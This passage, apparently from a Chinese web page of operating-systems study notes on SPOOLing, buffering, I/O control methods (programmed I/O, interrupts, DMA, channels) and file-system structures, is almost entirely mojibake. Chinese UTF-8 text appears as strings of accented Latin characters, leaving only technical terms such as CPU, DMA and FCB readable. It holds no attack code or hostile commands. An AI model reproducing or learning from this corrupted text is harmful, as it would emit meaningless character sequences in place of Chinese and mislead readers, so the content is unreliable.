çš„é€Ÿåº¦ã€‚ç¼“å’Œäº† CPU ä¸ä½é€Ÿ Iï¼Oè®¾å¤‡ä¹‹é—´é€Ÿåº¦ä¸åŒ¹é…çš„çŸ›ç›¾ã€‚</p><p>ï¼ˆ2ï¼‰å°†ç‹¬å è®¾å¤‡æ”¹é€ ä¸ºå…±äº«è®¾å¤‡ã€‚</p><p>ï¼ˆ3ï¼‰å®ç°äº†è™šæ‹Ÿè®¾å¤‡åŠŸèƒ½</p><p>SPOOLingæŠ€æœ¯é€šè¿‡æŠŠç‹¬å è®¾å¤‡æ”¹é€ æˆå…±äº«è®¾å¤‡ï¼Œä»è€Œæé«˜ç‹¬å è®¾å¤‡çš„åˆ©ç”¨ç‡</p></li><li><p>æ“ä½œç³»ç»Ÿä¸­é‡‡ç”¨ç¼“å†²æŠ€æœ¯çš„ç›®çš„æ˜¯ä¸ºäº†å¢å¼ºç³»ç»Ÿå¹¶è¡Œæ“ä½œçš„èƒ½åŠ›ã€‚</p><p>ä¸ºäº†æé«˜ CPU å’Œè®¾å¤‡ä¹‹é—´çš„å¹¶è¡Œç¨‹åº¦ã€‚</p></li><li><p>æ“ä½œç³»ç»Ÿé‡‡ç”¨ç¼“å†²æŠ€æœ¯ï¼Œèƒ½å¤Ÿå‡å°‘å¯¹ CPUçš„ä¸­æ–­æ¬¡æ•°ï¼Œä»è€Œæé«˜èµ„æºçš„åˆ©ç”¨ç‡ã€‚</p></li><li><p>åœ¨è®¾å¤‡ I/O ä¸­å¼•å…¥ç¼“å­˜æŠ€æœ¯æ˜¯ä¸ºäº†æ”¹å–„ CPU ä¸è®¾å¤‡ I/Oç›´æ¥é€Ÿåº¦ä¸åŒ¹é…çš„çŸ›ç›¾ã€‚</p></li><li><p>IO è½¯ä»¶å±‚æ¬¡ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡ä¸º: ç”¨æˆ·çº§ IOè½¯ä»¶ï¼Œä¸è®¾å¤‡æ— å…³çš„æ“ä½œç³»ç»Ÿè½¯ä»¶ï¼Œè®¾å¤‡é©±åŠ¨ç¨‹åºï¼Œä¸­æ–­å¤„ç†ç¨‹åºï¼Œç¡¬ä»¶ã€‚</p><p>å› æ­¤ï¼Œç”¨æˆ·ç¨‹åºå‘å‡ºç£ç›˜ IO è¯·æ±‚åï¼Œç³»ç»Ÿçš„æ­£ç¡®å¤„ç†æµç¨‹æ˜¯ï¼š</p><p>ç”¨æˆ·ç¨‹åº â†’ ç³»ç»Ÿè°ƒç”¨ç¨‹åº â†’ è®¾å¤‡é©±åŠ¨ç¨‹åº â†’ ä¸­æ–­å¤„ç†ç¨‹åºï¼ˆ â†’ç¡¬ä»¶ï¼‰</p></li><li><p>åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨ I/O è®¾å¤‡æ—¶ï¼Œé€šå¸¸é‡‡ç”¨é€»è¾‘è®¾å¤‡å</p><p>ç”¨æˆ·ç¨‹åºæå‡ºä½¿ç”¨è®¾å¤‡ç”³è¯·æ—¶ï¼Œä½¿ç”¨ç³»ç»Ÿè§„å®šçš„è®¾å¤‡ç±»å‹å·å’Œè‡ªå·±è§„å®šçš„è®¾å¤‡ç›¸å¯¹å·ï¼ˆå³é€»è¾‘è®¾å¤‡åï¼‰ç”±æ“ä½œç³»ç»Ÿè¿›è¡Œåœ°å€è½¬æ¢ï¼Œå˜æˆç³»ç»Ÿçš„è®¾å¤‡ç»å¯¹å·ï¼ˆç‰©ç†è®¾å¤‡å·ï¼‰ã€‚</p></li><li><p><a href="https://www.jianshu.com/p/9f39c992b804">I/Oæ§åˆ¶æ–¹å¼</a></p><p>å‰ä¸‰ç§ä¸ºæ“ä½œç³»ç»Ÿä¸­å¸¸è§çš„ I/O æ§åˆ¶æ–¹å¼</p><ol type="1"><li><p>ç¨‹åºç›´æ¥æ§åˆ¶</p><ol type="1"><li><p>CPU å¹²é¢„é¢‘ç‡ï¼šå¾ˆé¢‘ç¹ï¼ŒI/O æ“ä½œå¼€å§‹ä¹‹å‰ã€å®Œæˆä¹‹åéœ€è¦éœ€è¦ CPUä»‹å…¥ï¼Œ<strong>å¹¶ä¸”åœ¨ç­‰å¾… I/O å®Œæˆçš„è¿‡ç¨‹ä¸­éœ€è¦ CPUä¸æ–­è½®è¯¢æ£€æŸ¥ã€‚</strong></p></li><li><p>æ•°æ®çš„ä¼ é€å•ä½ï¼šæ¯æ¬¡è¯»/å†™ä¸€ä¸ªå­—ã€‚</p></li><li><p>æ•°æ®æµå‘ Â  è¯»æ“ä½œï¼ˆæ•°æ®è¾“å…¥ï¼‰ï¼šI/O è®¾å¤‡â€”&gt;CPUâ€”&gt;å†…å­˜ Â å†™æ“ä½œï¼ˆæ•°æ®è¾“å‡ºï¼‰ï¼šå†…å­˜â€”&gt;CPUâ€”&gt;I/O è®¾å¤‡ Â  æ¯ä¸ªå­—çš„è¯»/å†™éƒ½éœ€è¦ CPUçš„å¸®å¿™ã€‚</p></li><li><p>ä¸»è¦ä¼˜ç¼ºç‚¹</p></li></ol><p>ä¼˜ç‚¹ï¼šå®ç°ç®€å•ã€‚åœ¨è¯»/å†™æŒ‡ä»¤ä¹‹åï¼ŒåŠ ä¸Šå®ç°å¾ªç¯æ£€æŸ¥çš„ä¸€ç³»åˆ—æŒ‡ä»¤å³å¯ï¼ˆå› æ­¤æ‰ç§°ä¸ºâ€œç¨‹åºç›´æ¥æ§åˆ¶æ–¹å¼â€ï¼‰ã€‚</p><p>ç¼ºç‚¹ï¼š<strong>CPU å’Œ I/O è®¾å¤‡åªèƒ½ä¸²è¡Œå·¥ä½œï¼ŒCPUéœ€è¦ä¸€ç›´è½®è¯¢æ£€æŸ¥ï¼Œé•¿æœŸå¤„äº"å¿™ç­‰"çŠ¶æ€ï¼ŒCPU åˆ©ç”¨ç‡ä½ã€‚</strong></p></li><li><p>ä¸­æ–­é©±åŠ¨ IO</p><ol type="1"><li><p>CPU å¹²é¢„é¢‘ç‡ï¼šæ¯æ¬¡ I/O æ“ä½œå¼€å§‹ä¹‹å‰ã€å®Œæˆä¹‹åéœ€è¦éœ€è¦ CPUä»‹å…¥ï¼Œ<strong>ç­‰å¾… I/O å®Œæˆçš„è¿‡ç¨‹ä¸­ CPUå¯ä»¥åˆ‡æ¢åˆ°åˆ«çš„è¿›ç¨‹æ‰§è¡Œ</strong>ã€‚</p></li><li><p>æ•°æ®çš„ä¼ é€å•ä½ï¼šæ¯æ¬¡è¯»/å†™ä¸€ä¸ªå­—ã€‚</p></li><li><p>æ•°æ®æµå‘ Â  è¯»æ“ä½œï¼ˆæ•°æ®è¾“å…¥ï¼‰ï¼šI/O è®¾å¤‡â€”&gt;CPUâ€”&gt;å†…å­˜ Â å†™æ“ä½œï¼ˆæ•°æ®è¾“å‡ºï¼‰ï¼šå†…å­˜â€”&gt;CPUâ€”&gt;I/O è®¾å¤‡</p></li><li><p>ä¸»è¦ä¼˜ç¼ºç‚¹</p></li></ol><p>ä¼˜ç‚¹ï¼šä¸â€œç¨‹åºç›´æ¥æ§åˆ¶æ–¹å¼ç›¸æ¯”â€ï¼Œåœ¨â€œä¸­æ–­é©±åŠ¨æ–¹å¼â€ä¸­ï¼ŒI/Oæ§åˆ¶å™¨ä¼šé€šè¿‡ä¸­æ–­ä¿¡å·ä¸»åŠ¨æŠ¥å‘Š I/O å·²å®Œæˆï¼ŒCPUä¸å†éœ€è¦ä¸åœçš„è½®åºã€‚<strong>CPU å¯ä»¥å’Œ I/O è®¾å¤‡å¹¶è¡Œå·¥ä½œ</strong>ï¼ŒCPUåˆ©ç”¨æ•ˆç‡æ˜æ˜¾æå‡ã€‚</p><p>ç¼ºç‚¹ï¼šæ¯ä¸ªå­—åœ¨ I/O è®¾å¤‡å’Œå†…å­˜ä¹‹é—´ä¼ è¾“ï¼Œéƒ½éœ€è¦ç»è¿‡CPUã€‚è€Œ<strong>é¢‘ç¹çš„ä¸­æ–­å¤„ç†ä¼šæ¶ˆè€—è¾ƒå¤šçš„ CPU æ—¶é—´ã€‚</strong></p><p>ç¨‹åºæ§åˆ¶ IO å’Œä¸­æ–­é©±åŠ¨ IO ï¼Œä»–ä»¬çš„æ•°æ®ä¼ è¾“è¿‡ç¨‹éƒ½éœ€è¦ç»è¿‡CPUã€‚ä¸”ä»–ä»¬äºŒè€…çš„æ•°æ®ä¼ é€å‡ä»¥å­—ï¼ˆwordï¼‰ä¸ºå•ä½ã€‚</p></li><li><p>ç›´æ¥å­˜å‚¨å™¨è®¿é—® DMA</p><p>DMA æ§åˆ¶çš„å¯„å­˜å™¨åŠä½œç”¨ï¼š</p><ol type="1"><li><p>æ•°æ®å¯„å­˜å™¨ï¼ˆ<strong>DR</strong>ï¼ŒDataRegisterï¼‰ï¼šæš‚å­˜ä»è®¾å¤‡åˆ°å†…å­˜ï¼Œæˆ–è€…ä»å†…å­˜åˆ°è®¾å¤‡çš„æ•°æ®ã€‚</p></li><li><p>å†…å­˜åœ°å€å¯„å­˜å™¨ï¼ˆ<strong>MAR</strong>ï¼ŒMemory AddressRegisterï¼‰ï¼šåœ¨è®¾å¤‡å‘å†…å­˜è¾“å…¥æ•°æ®æ—¶ï¼ŒMARè¡¨ç¤ºè¾“å…¥çš„æ•°æ®åº”è¯¥å­˜æ”¾åˆ°å†…å­˜çš„ä»€ä¹ˆä½ç½®ï¼Œåœ¨å†…å­˜å‘è®¾å¤‡è¾“å‡ºæ•°æ®æ—¶ï¼ŒMARè¡¨ç¤ºè¦è¾“å‡ºçš„æ•°æ®æ”¾åœ¨å†…å­˜çš„ä»€ä¹ˆä½ç½®ã€‚</p></li><li><p>æ•°æ®è®¡æ•°å™¨ï¼ˆ<strong>DC</strong>ï¼ŒDataCounterï¼‰ï¼šè¡¨ç¤ºå‰©ä½™è¦è¯»/å†™çš„å­—èŠ‚æ•°ã€‚</p></li><li><p>å‘½ä»¤/çŠ¶æ€å¯„å­˜å™¨ï¼ˆ<strong>CR</strong>ï¼ŒCommandRegisterï¼‰ï¼šç”¨äºå­˜æ”¾ CPU å‘æ¥çš„ I/O å‘½ä»¤ï¼Œæˆ–è®¾å¤‡çš„çŠ¶æ€ä¿¡æ¯ã€‚</p></li><li><p>CPU å¹²é¢„é¢‘ç‡ï¼šä»…åœ¨ä¼ é€ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®å—å¼€å§‹å’Œç»“æŸæ—¶ï¼Œæ‰éœ€è¦ CPUå¹²é¢„ã€‚</p></li><li><p>æ•°æ®çš„ä¼ é€å•ä½ï¼šæ¯æ¬¡è¯»/å†™<strong>ä¸€ä¸ªæˆ–å¤šä¸ªå—ã€‚ï¼ˆæ³¨ï¼šæ¯æ¬¡è¯»å†™çš„åªèƒ½æ˜¯è¿ç»­çš„å¤šä¸ªå—ï¼Œä¸”è¿™äº›å—è¯»å…¥å†…å­˜ååœ¨å†…å­˜ä¸­ä¹Ÿå¿…é¡»æ˜¯è¿ç»­çš„ï¼‰</strong></p></li><li><p>æ•°æ®æµå‘ï¼ˆ<strong>ä¸å†éœ€è¦ç»è¿‡ CPU</strong>ï¼‰Â è¯»æ“ä½œï¼ˆæ•°æ®è¾“å…¥ï¼‰ï¼šI/O è®¾å¤‡â€”&gt;å†…å­˜ Â  å†™æ“ä½œï¼ˆæ•°æ®è¾“å‡ºï¼‰ï¼šå†…å­˜â€”&gt;I/Oè®¾å¤‡</p></li><li><p>ä¸»è¦ä¼˜ç¼ºç‚¹</p></li></ol><p>ä¼˜ç‚¹ï¼šæ•°æ®ä¼ è¾“ä»¥ â€œå—â€ ä¸ºå•ä½ï¼ŒCPUä»‹å…¥çš„é¢‘ç‡è¿›ä¸€æ­¥é™ä½ã€‚æ•°æ®çš„ä¼ è¾“ä¸å†éœ€è¦å…ˆç»è¿‡ CPUå†å†™å…¥å†…å­˜ï¼Œæ•°æ®ä¼ è¾“æ•ˆç‡è¿›ä¸€æ­¥å¢åŠ ï¼ŒCPU å’Œ I/Oè®¾å¤‡çš„å¹¶è¡Œæ€§èƒ½å¾—åˆ°æå‡ã€‚</p><p>ç¼ºç‚¹ï¼šCPU æ¯å‘å‡ºä¸€æ¡ I/OæŒ‡ä»¤ï¼Œåªèƒ½è¯»/å†™ä¸€ä¸ªæˆ–å¤šä¸ª<strong>è¿ç»­çš„æ•°æ®å—</strong>ã€‚å¦‚æœè¦è¯»/å†™å¤šä¸ªç¦»æ•£çš„å—ï¼Œæˆ–è€…è¦å°†æ•°æ®åˆ†åˆ«å†™åˆ°ä¸åŒçš„å†…å­˜åŒºåŸŸæ—¶ï¼ŒCPUè¦åˆ†åˆ«å‘å‡ºå¤šæ¡ I/O æŒ‡ä»¤ï¼Œè¿›è¡Œå¤šæ¬¡ä¸­æ–­æ“ä½œã€‚</p><p>é‡‡ç”¨ç›´æ¥å­˜å–æ³•æ¥è¯»å†™ç£ç›˜ä¸Šçš„ç‰©ç†è®°å½•æ—¶ï¼Œæ•ˆç‡æœ€é«˜çš„æ˜¯è¿ç»­ç»“æ„çš„æ–‡ä»¶</p></li><li><p>æ‰€è°“è™šæ‹Ÿå­˜å‚¨å™¨ï¼šæ˜¯æŒ‡å…·æœ‰è¯·æ±‚è°ƒå…¥åŠŸèƒ½å’Œç½®æ¢åŠŸèƒ½ï¼Œèƒ½ä»é€»è¾‘ä¸Šå¯¹å†…å­˜å®¹é‡åŠ ä»¥æ‰©å……çš„ä¸€ç§å­˜å‚¨å™¨ç³»ç»Ÿï¼Œå…¶é€»è¾‘å®¹é‡ç”±å†…å­˜å®¹é‡å’Œå¤–å­˜å®¹é‡ä¹‹å’Œæ‰€å†³å®šï¼Œå…¶è¿è¡Œé€Ÿåº¦æ¥è¿‘äºå†…å­˜é€Ÿåº¦ï¼Œè€Œæ¯ä½çš„æˆæœ¬å´åˆæ¥è¿‘äºå¤–å­˜ã€‚</p><p>å¼•å…¥å’Œä½¿ç”¨è™šæ‹Ÿå­˜å‚¨å™¨çš„ä¸»è¦ç›®çš„æé«˜ç³»ç»Ÿçš„å†…å­˜åˆ©ç”¨ç‡ã€‚</p></li><li><p><strong>è™šæ‹Ÿå­˜å‚¨çš„å®ç°</strong></p><ul><li>è¯·æ±‚åˆ†é¡µå­˜å‚¨ç®¡ç†æ–¹å¼</li><li>è¯·æ±‚åˆ†æ®µç³»ç»Ÿ</li></ul></li><li><p>IO é€šé“</p><p>IO é€šé“çš„ç±»å‹</p><ol type="1"><li>å­—èŠ‚å¤šè·¯é€šé“</li><li>æ•°ç»„é€‰æ‹©é€šé“</li><li>æ•°ç»„å¤šè·¯é€šé“</li></ol><p>[é€šé“]](https://raw.githubusercontent.com/violetu/blogimages/master/20200728220317.png)</p><blockquote><ol type="1"><li>é€šé“å’Œ CPUçš„åŒºåˆ«åœ¨äºï¼šé€šé“èƒ½è¯†åˆ«çš„æŒ‡ä»¤å•ä¸€ï¼Œé€šé“æ²¡æœ‰è‡ªå·±çš„å†…å­˜ï¼Œéœ€è¦å’Œ CPUå…±äº«å†…å­˜(é€šé“ç¨‹åºï¼šä¿å­˜åœ¨ä¸»å­˜ä¸­)ã€‚æ‰€ä»¥è¯´å¯ä»¥æŠŠé€šé“çœ‹ä½œâ€œä½é…ç‰ˆçš„CPUâ€ã€‚</li><li>é€šé“å’Œ DMA æ–¹å¼çš„åŒºåˆ«ï¼šDMA æ–¹å¼éœ€è¦ CPUæ¥æ§åˆ¶ä¼ è¾“çš„æ•°æ®å—çš„å¤§å°ã€ä¼ è¾“çš„ä½ç½®ï¼Œè€Œé€šé“æ–¹å¼ä¸­çš„è¿™äº›ä¿¡æ¯æ˜¯ç”±é€šé“æ§åˆ¶çš„ã€‚å¦å¤–ï¼Œæ¯ä¸ªDMAæ§åˆ¶å™¨å¯¹åº”ä¸€å°è®¾å¤‡ä¸å†…å­˜ä¼ é€’æ•°æ®ï¼Œè€Œä¸€ä¸ªé€šé“å¯ä»¥æ§åˆ¶å¤šå°è®¾å¤‡ä¸å†…å­˜æ•°æ®äº¤æ¢ã€‚</li></ol></blockquote><p>é€šé“æ§åˆ¶æ–¹å¼åˆ†æï¼š</p><blockquote><ol type="1"><li>CPU å¹²é¢„é¢‘ç‡ï¼šæä½ï¼Œé€šé“ä¼šæ ¹æ® CPUçš„æŒ‡ç¤ºæ‰§è¡Œç›¸åº”çš„é€šé“ç¨‹åºï¼Œåªæœ‰å®Œæˆä¸€ç»„æ•°æ®å—çš„è¯»/å†™åæ‰éœ€è¦å‘å‡ºä¸­æ–­ä¿¡å·ï¼Œè¯·æ±‚CPU å¹²é¢„ã€‚</li><li>æ•°æ®çš„ä¼ é€å•ä½ï¼šæ¯æ¬¡è¯»/å†™ä¸€ç»„å—ã€‚</li><li>æ•°æ®æµå‘ï¼ˆä¸å†éœ€è¦ç»è¿‡ CPUï¼‰ Â Â  è¯»æ“ä½œï¼ˆæ•°æ®è¾“å…¥ï¼‰ï¼šI/Oè®¾å¤‡â€”&gt;å†…å­˜ Â Â  å†™æ“ä½œï¼ˆæ•°æ®è¾“å‡ºï¼‰ï¼šå†…å­˜â€”&gt;I/O è®¾å¤‡</li><li>ä¸»è¦ä¼˜ç¼ºç‚¹ Â Â  ä¼˜ç‚¹ï¼šCPUã€é€šé“ã€I/O è®¾å¤‡å¯å¹¶è¡Œå·¥ä½œï¼Œèµ„æºåˆ©ç”¨ç‡å¾ˆé«˜ã€‚Â Â  ç¼ºç‚¹ï¼šå®ç°å¤æ‚ï¼Œéœ€è¦ä¸“é—¨çš„ç¡¬ä»¶æ”¯æŒã€‚</li></ol></blockquote><p>éœ€è¦ CPU å¹²é¢„é¢‘ç‡ä»å¤šåˆ°å°‘ï¼šç¨‹åºæ§åˆ¶ IO â†’ ä¸­æ–­é©±åŠ¨ IO â†’ ç›´æ¥å­˜å‚¨å™¨è®¿é—®â†’ IO é€šé“ â†’ å¤–å›´å¤„ç†æœº</p><p>é€šé“æ˜¯ä¸€ç§ I/O ä¸“ç”¨å¤„ç†æœºã€‚</p><p>è®¡ç®—æœºç³»ç»Ÿä¸­èƒ½å¤Ÿç‹¬ç«‹å®Œæˆè¾“å…¥è¾“å‡ºæ“ä½œçš„ç¡¬ä»¶è£…ç½®ï¼Œä¹Ÿç§°ä¸ºâ€œè¾“å…¥è¾“å‡ºå¤„ç†æœºâ€ï¼Œèƒ½æ¥æ”¶ä¸­å¤®å¤„ç†æœºçš„å‘½ä»¤ï¼Œç‹¬ç«‹æ‰§è¡Œé€šé“ç¨‹åºï¼ŒååŠ©ä¸­å¤®å¤„ç†æœºæ§åˆ¶ä¸ç®¡ç†å¤–éƒ¨è®¾å¤‡ã€‚ä¸€ä¸ªç‹¬ç«‹äºCPU çš„ä¸“é—¨ I/O æ§åˆ¶çš„å¤„ç†æœºï¼Œæ§åˆ¶è®¾å¤‡ä¸å†…å­˜ç›´æ¥è¿›è¡Œæ•°æ®äº¤æ¢ã€‚</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200728220408.png"alt="IO ctl" /><figcaption aria-hidden="true">IO ctl</figcaption></figure></li></ol></li></ol><h2 id="æ–‡ä»¶ç³»ç»Ÿ">æ–‡ä»¶ç³»ç»Ÿ</h2><ol type="1"><li><p>æ–‡ä»¶ç³»ç»Ÿçš„ä¸»è¦ç›®çš„æ˜¯å®ç°å¯¹æ–‡ä»¶çš„æŒ‰åå­˜å–</p></li><li><p>æ–‡ä»¶çš„å­˜å‚¨ç®¡ç†å®é™…ä¸Šæ˜¯å¯¹å¤–å­˜çš„ç®¡ç†ã€‚</p></li><li><p>æŒ‰æ–‡ä»¶çš„é€»è¾‘ç»“æ„å¯åˆ†ä¸ºæœ‰ç»“æ„æ–‡ä»¶ï¼ˆè®°å½•å¼æ–‡ä»¶ï¼‰å’Œæ— ç»“æ„æ–‡ä»¶ï¼ˆæµå¼æ–‡ä»¶ï¼‰ã€‚è€ŒUNIXã€DOSã€WINDOWS ç³»ç»Ÿä¸­çš„æ™®é€šæ–‡ä»¶éƒ½æ˜¯æµå¼æ–‡ä»¶ã€‚</p><p>Windows å’Œ Unix è¿™ç§ç³»ç»Ÿåˆ™æŠŠç»“æ„åŒ–ç•™ç»™åº”ç”¨ç¨‹åºã€‚ Windows å’Œ UNIXæä¾›äº†ä½çº§æ–‡ä»¶ç³»ç»Ÿã€‚</p></li><li><p>ä»å¯¹æ–‡ä»¶ä¿¡æ¯çš„å­˜å–æ¬¡åºè€ƒè™‘ï¼Œå­˜å–æ–¹æ³•å¯åˆ†ä¸ºï¼šé¡ºåºå­˜å–å’Œéšæœºå­˜å–ä¸¤ç§ã€‚ç£å¸¦ä¸Šçš„æ–‡ä»¶åªèƒ½é¡ºåºå­˜å–ï¼Œç£ç›˜ä¸Šçš„æ–‡ä»¶æ—¢å¯é‡‡ç”¨é¡ºåºæ–¹å¼ä¹Ÿå¯ç”¨éšæœºæ–¹å¼å­˜å–ã€‚</p></li><li><p>æ–‡ä»¶çš„åˆ†ç±»</p><ol type="1"><li>æŒ‰ç”¨é€”ï¼šç³»ç»Ÿæ–‡ä»¶ã€ç”¨æˆ·æ–‡ä»¶ã€åº“æ–‡ä»¶</li><li>æºæ–‡ä»¶ã€ç›®æ ‡æ–‡ä»¶ã€å¯æ‰§è¡Œæ–‡ä»¶</li><li>æŒ‰ä¿æŠ¤çº§ï¼šåªè¯»ã€è¯»å†™ã€æ‰§è¡Œ</li><li>æ™®é€šæ–‡ä»¶ã€ç›®å½•æ–‡ä»¶ã€ç‰¹æ®Šæ–‡ä»¶</li></ol></li><li><p>æ–‡ä»¶çš„å¤§å°ä¸åªå—ç£ç›˜å®¹é‡çš„é™åˆ¶ï¼Œè¿˜å—æ–‡ä»¶ç³»ç»Ÿæ ¼å¼ã€æ–‡ä»¶å­˜å‚¨ç»“æ„ç­‰çš„é™åˆ¶ã€‚</p></li><li><p>æ–‡ä»¶ç›®å½•æ˜¯æ–‡ä»¶æ§åˆ¶å—çš„æœ‰åºé›†åˆï¼Œè€Œç›®å½•æ–‡ä»¶ï¼ˆå³ï¼šç›®å½•ä¹Ÿæ˜¯æ–‡ä»¶ï¼‰æ˜¯ä¸ºäº†å®ç°å¯¹æ–‡ä»¶ç›®å½•çš„ç®¡ç†ï¼Œé€šå¸¸æŠŠæ–‡ä»¶ç›®å½•ä»¥æ–‡ä»¶å½¢å¼ä¿å­˜åœ¨å¤–å­˜ã€‚</p></li><li><p>ä»ç‰©ç†ç»“æ„çš„ä¼˜ç¼ºç‚¹</p><ol type="1"><li><p>é¡ºåºç»“æ„ ä¼˜ç‚¹ 1ã€ç®€å•ï¼šå­˜å‚¨ä¸ç®¡ç†éƒ½ç®€å•ï¼Œä¸”å®¹æ˜“å®ç°ã€‚2ã€æ”¯æŒé¡ºåºå­˜å–å’Œéšæœºå­˜å–ã€‚ 3ã€é¡ºåºå­˜å–é€Ÿåº¦å¿«ã€‚4ã€æ‰€éœ€çš„ç£ç›˜å¯»é“æ¬¡æ•°å’Œå¯»é“æ—¶é—´æœ€å°‘ã€‚ ç¼ºç‚¹1ã€éœ€è¦ä¸ºæ¯ä¸ªæ–‡ä»¶é¢„ç•™è‹¥å¹²ç‰©ç†å—ä»¥æ»¡è¶³æ–‡ä»¶å¢é•¿çš„éƒ¨åˆ†éœ€è¦ã€‚2ã€ä¸åˆ©äºæ–‡ä»¶æ’å…¥å’Œåˆ é™¤ã€‚</p></li><li><p>é“¾å¼ç»“æ„ ä¼˜ç‚¹1ã€æé«˜äº†ç£ç›˜ç©ºé—´åˆ©ç”¨ç‡(æé«˜äº†å­˜å‚¨ç©ºé—´çš„åˆ©ç”¨ç‡)ï¼Œä¸éœ€è¦ä¸ºæ¯ä¸ªæ–‡ä»¶é¢„ç•™ç‰©ç†å—ã€‚2ã€æœ‰åˆ©äºæ–‡ä»¶æ’å…¥å’Œåˆ é™¤ã€‚ 3ã€æœ‰åˆ©äºæ–‡ä»¶åŠ¨æ€æ‰©å……ã€‚</p><p>4ã€åœ¨é¡ºåºè¯»å–æ—¶æ•ˆç‡è¾ƒé«˜, ä½†éœ€è¦éšæœºå­˜å–æ—¶æ•ˆç‡ä½ä¸‹ ç¼ºç‚¹1ã€å­˜å–é€Ÿåº¦æ…¢ï¼Œä¸é€‚äºéšæœºå­˜å–ã€‚2ã€å½“ç‰©ç†å—é—´çš„è¿æ¥æŒ‡é’ˆå‡ºé”™æ—¶ï¼Œæ•°æ®ä¸¢å¤±ã€‚å¯é æ€§ä½3ã€æ›´å¤šçš„å¯»é“æ¬¡æ•°å’Œå¯»é“æ—¶é—´ã€‚4ã€é“¾æ¥æŒ‡é’ˆå ç”¨ä¸€å®šçš„ç©ºé—´ï¼Œé™ä½äº†ç©ºé—´åˆ©ç”¨ç‡ã€‚</p></li><li><p>ç´¢å¼•ç»“æ„ ä¼˜ç‚¹ 1ã€ä¸éœ€è¦ä¸ºæ¯ä¸ªæ–‡ä»¶é¢„ç•™ç‰©ç†å—ã€‚2ã€æ—¢èƒ½é¡ºåºå­˜å–ï¼Œåˆèƒ½éšæœºå­˜å–ã€‚ 3ã€æ»¡è¶³äº†æ–‡ä»¶åŠ¨æ€å¢é•¿ã€æ’å…¥åˆ é™¤çš„è¦æ±‚ã€‚ç¼ºç‚¹ 1ã€è¾ƒå¤šçš„å¯»é“æ¬¡æ•°å’Œå¯»é“æ—¶é—´ã€‚2ã€ç´¢å¼•è¡¨æœ¬èº«å¸¦æ¥äº†ç³»ç»Ÿå¼€é”€ã€‚å¦‚ï¼šå†…å¤–å­˜ç©ºé—´ï¼Œå­˜å–æ—¶é—´ç­‰</p><p>é€‚åˆéšæœºå­˜å–ï¼šè¿ç»­ç»“æ„ã€ç´¢å¼•ç»“æ„</p><p>æ˜“äºæ–‡ä»¶æ‰©å±•ï¼šé“¾å¼ç»“æ„ã€ç´¢å¼•ç»“æ„</p><p>é€‚åˆéšæœºå­˜å–ä¸”æ–‡ä»¶æ‰©å±•çš„ï¼šç´¢å¼•ç»“æ„</p><p>ç´¢å¼•æ–‡ä»¶çš„ä¼˜ç‚¹ï¼šå…è®¸æ–‡ä»¶åŠ¨æ€ä¿®æ”¹ï¼Œå¯ç›´æ¥å¯¹æ–‡ä»¶è¿›è¡Œå­˜å–</p></li></ol></li><li><p>ä»ç³»ç»Ÿè§’åº¦çœ‹ï¼Œæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªè´Ÿè´£æ–‡ä»¶å­˜å‚¨ç©ºé—´çš„ç®¡ç†æœºæ„ï¼Œæ–‡ä»¶ç®¡ç†å®é™…æ˜¯å¯¹è¾…åŠ©å­˜å‚¨ç©ºé—´çš„ç®¡ç†ã€‚</p></li><li><p>å¯¹é¡ºåºæ–‡ä»¶è¿›è¡Œæ£€ç´¢æ—¶ï¼Œé¦–å…ˆä» FCBä¸­è¯»å‡ºæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªç›˜å—å·ï¼›è€Œå¯¹ç´¢å¼•æ–‡ä»¶è¿›è¡Œæ£€ç´¢æ—¶ï¼Œåº”å…ˆä» FCBä¸­è¯»å‡ºæ–‡ä»¶ç´¢å¼•è¡¨å§‹å€ã€‚</p></li><li><p>ä¸‹é¢è¿™å¥è¯æ˜¯é”™è¯¯çš„ï¼šé¡ºåºæ–‡ä»¶é€‚äºå»ºç«‹åœ¨é¡ºåºå­˜å‚¨è®¾å¤‡ä¸Šï¼Œè€Œä¸é€‚åˆå»ºç«‹åœ¨ç£ç›˜ä¸Šã€‚</p><p>é”™è¯¯åŸå› ï¼š</p><p>é¡ºåºæ–‡ä»¶å­˜æ”¾åœ¨å¤šè·¯å­˜å‚¨è®¾å¤‡(å¦‚ç£ç›˜)ä¸Šæ—¶ï¼Œåœ¨å¤šé“ç¨‹åºçš„æƒ…å†µä¸‹ï¼Œç”±äºåˆ«çš„ç”¨æˆ·å¯èƒ½é©±ä½¿ç£å¤´ç§»å‘å…¶å®ƒæŸ±é¢ï¼Œä¼šé™ä½è¿ç»­å­˜å–çš„é€Ÿåº¦ã€‚é¡ºåºæ–‡ä»¶å¤šç”¨äºç£å¸¦ã€‚</p><p>é¡ºåºæ–‡ä»¶ä¸å¤ªé€‚åˆå­˜å‚¨åœ¨ç£ç›˜ä¸Šå¹¶ä¸æ˜¯å› ä¸ºå®ƒä¸æ˜¯é¡ºåºå­˜å‚¨è®¾å¤‡ï¼ˆä»–æ˜¯åŠé¡ºåºå­˜å‚¨ï¼‰ï¼Œè€Œæ˜¯å¤šé“ç¨‹åºçš„äº‹æƒ…ã€‚</p></li><li><p>é¡ºåºæ–‡ä»¶å¿…é¡»é‡‡ç”¨è¿ç»­åˆ†é…æ–¹å¼ï¼Œè€Œé“¾æ¥æ–‡ä»¶å’Œç´¢å¼•æ–‡ä»¶åˆ™éƒ½å¯é‡‡å–ç¦»æ•£åˆ†é…æ–¹å¼ã€‚</p></li><li><p>ä¸€ä¸ªé‡‡ç”¨äºŒçº§ç´¢å¼•æ–‡ä»¶ç³»ç»Ÿï¼Œå­˜å–ä¸€å—ç›˜å—ä¿¡æ¯é€šå¸¸è¦è®¿é—® 3æ¬¡ç£ç›˜ã€‚</p></li><li><p>æ–‡ä»¶ç›®å½•é¡¹ / æ–‡ä»¶æ§åˆ¶å— ( FCB )æ˜¯ç³»ç»Ÿç®¡ç†æ–‡ä»¶çš„å¿…é¡»ä¿¡æ¯ç»“æ„ï¼Œæ˜¯æ–‡ä»¶å­˜åœ¨çš„å”¯ä¸€æ ‡å¿—ï¼Œæ‰“å¼€æ–‡ä»¶æŠŠæ–‡ä»¶ç›®å½•é¡¹( FCB ) 